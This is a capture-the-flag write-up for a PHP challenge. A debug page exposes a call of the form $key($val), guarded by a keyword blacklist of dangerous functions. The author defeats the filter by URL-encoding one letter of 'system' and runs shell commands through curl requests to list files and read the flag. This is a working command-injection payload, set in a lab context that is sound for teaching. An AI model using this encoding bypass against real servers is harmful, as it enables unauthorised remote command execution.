# Urlparameter
Author: avarx

```$ curl http://35.196.45.11:8080/robots.txt```

returns:
```text
# you know de wae ma queen
User-Agent: *
Disallow: /?debug
```

```$ curl http://35.196.45.11:8080/?debug```

returns:
```PHP
$blacklist = "assert|system|passthru|exec|assert|read|open|eval|`|_|file|dir|\.\.|\/\/|curl|ftp|glob";
if(count($_GET) > 0){
	if(preg_match("/$blacklist/i",$_SERVER["REQUEST_URI"])) die("No no no hackers!!");
	list($key, $val) = each($_GET);
	$key($val);
}
```

The interesting part is **$_SERVER["REQUEST_URI"]** is urlencoded **$_GET** is not.

```$ curl "http://35.196.45.11:8080/?%73ystem=ls"```

would so result in:


| Variable				 | Content|
| -----------------------|:-------------:|
| $_SERVER["REQUEST_URI"]|/?%73ystem=ls|
| $_GET:				 |[system] => ls|

This allows us to bypass the filter ($blacklist).


```curl "http://35.196.45.11:8080/?%73ystem=ls"```

returns:
```text
flag-a-long-name-that-you-wont-know.php
index.php
robots.txt
```

```curl "http://35.196.45.11:8080/?%73ystem=cat%20flag-a-long-name-that-you-wont-know.php"```

returns:
```PHP
<?php
    //here the flag: AceBear{I_did_something_stupid_with_url}
?>
```